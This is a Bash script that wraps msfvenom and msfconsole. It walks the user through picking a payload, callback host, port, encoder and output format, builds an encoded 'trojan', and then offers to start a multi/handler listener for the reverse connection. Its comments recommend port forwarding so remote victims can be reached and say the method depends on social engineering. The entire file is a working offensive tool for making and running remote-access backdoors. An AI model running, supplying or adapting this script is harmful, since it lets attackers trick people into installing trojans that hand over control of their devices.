#!/bin/bash
#Note for wan you must portforward your router, Or generate a trojan for someone else who was.
#You must have good social skills to use this attack method successfully 
clear
cat banners/banner1
echo "------------------------------------------------------------------------------------------"
echo 'payload: ' 
cd payload
read -e payload 
echo "------------------------------------------------------------------------------------------"
echo "Please enter IP Adress of the device to bind to the listener to" 
echo "Leave blank if you don't plan to start a listener after"
echo "Getting Current interface IP Adresses"
echo "************ "
ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
echo "************"
read lhost
echo "------------------------------------------------------------------------------------------"
printf 'Your WAN IP is: ' && wget -qO- ifconfig.co
echo "Please enter the Host for the trojan to connect back to:"
read host
echo "------------------------------------------------------------------------------------------"
echo 'lport: '
read -e lport
echo "------------------------------------------------------------------------------------------"
echo 'lhost: '
read lhost
echo "------------------------------------------------------------------------------------------"
echo 'encoder: ' 
cd ../encoder
read -e encoder
echo "------------------------------------------------------------------------------------------"
echo 'ittirations: '
read -e itirations
echo "------------------------------------------------------------------------------------------"
echo 'format: '
cd ../format
read -e format 
echo "------------------------------------------------------------------------------------------"
echo 'output: ' 
cd ../
read -e output
msfvenom -p $payload lhost=$lhost lport=$lport -e $encoder -i $itirations -f $format -o $output

echo "Would you like to start a listener for your newly generated trojan?"
select yn in "Yes" "No"; do
    case $yn in
        Yes ) msfconsole -x "use exploit/multi/handler; set payload '${payload}'; set LHOST '${lhost}'; set LPORT '${lport}'; exploit" ; break;;
        No ) exit;;
    esac
done
